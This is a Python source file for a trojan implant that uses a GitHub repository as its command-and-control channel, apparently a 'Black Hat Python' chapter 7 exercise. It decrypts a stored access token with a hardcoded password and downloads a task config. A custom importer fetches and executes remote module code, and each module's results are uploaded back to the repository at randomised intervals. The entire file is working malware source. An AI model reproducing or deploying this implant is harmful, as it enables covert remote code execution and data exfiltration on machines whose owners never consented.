#!/usr/bin/env python3
import json
import base64
import sys
import time
import importlib
import random
import threading
import queue
import importlib

from github import Github

import encrypt

verbose = True

# Access token needs to be the first line in file
access_token_path = 'access_token.txt.enc'
najort_id = 'tset_najort'
najort_config = 'ch7/{}.json'.format(najort_id)
data_path = 'ch7/data/{}/'.format(najort_id)

najort_mods = []
configured = False
task_queue = queue.Queue()


def vprint(verbose_string, lverbose=False):
    global verbose
    if lverbose or verbose:
        if lverbose:
            icon = lverbose
        else:
            icon = '*'
        print('[{}] {}'.format(icon, verbose_string), flush=True)


def connect_to_github(access_token_path=access_token_path):
    hg = None
    if access_token_path.endswith('.enc'):
        access_token = encrypt.decrypt_file(access_token_path, 'bhp1BHP!')
    else:
        with open(access_token_path, 'r') as token_file:
            access_token = token_file.readline()
    if len(access_token) == 40:
        hg = Github(access_token)
    else:
        exit(0)
    repo = hg.get_repo('chrisarm/BHP')
    branch = repo.get_branch(branch='master')
    vprint(repo)
    vprint(branch)
    return hg, repo, branch


def get_file_contents(file_path):
    hg, repo, branch = connect_to_github()
    file_contents = None
    try:
        vprint('Trying to get file {}'.format(file_path))
        file_contents = repo.get_contents(file_path).content
        vprint('Found file {}'.format(file_path))
    except Exception as eg:
        vprint('File not found!')
        raise
    return file_contents


def get_najort_config():
    global configured
    config_json = get_file_contents(najort_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    vprint(config)
    for task in config:
        if task['module'] not in sys.modules:
            try:
                importlib.import_module(task['module'])
            except ModuleNotFoundError as mnf:
                raise
            except Exception:
                raise
    return config


def store_module_result(data):
    hg, repo, branch = connect_to_github()
    remote_path = 'ch7/data/{}/{}.dat'.format(
        najort_id,
        random.randint(1000, 10000))
    repo.create_file(remote_path, 'Mods Results', base64.b64encode(data))
    vprint('Module data saved')
    return


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    store_module_result(result)
    return


class GitImporter:

    def __init__(self):
        self.current_module_code = ''
        self.config = dict()

    def find_module(self, fullname, path=None):
        if fullname.startswith('tig_'):
            vprint('Attempting to retrieve {}'.format(fullname))
            new_library = get_file_contents('ch7/modules/{}'.format(fullname))
            vprint(new_library)
            if new_library:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        if isinstance(name, str) and name in sys.modules:
            return sys.modules[name]
        elif isinstance(name, str):
            try:
                module = importlib.import_module(name)
                return module
            except Exception as elm:
                vprint('Unable to load module. {}'.format(elm))
                raise
        else:
            raise ValueError('Module {} not loaded.'.format(name))


def main():
    sys.meta_path.append(GitImporter())

    while True:
        if task_queue.empty():
            config = get_najort_config()
            vprint(config)

            if config and configured:
                for task in config:
                    t = threading.Thread(
                        target=module_runner,
                        args=(task['module'],))
                    t.start()
                    time.sleep(random.randint(1, 10))
        time.sleep(random.randint(100, 1000))


if __name__ == '__main__':
    main()
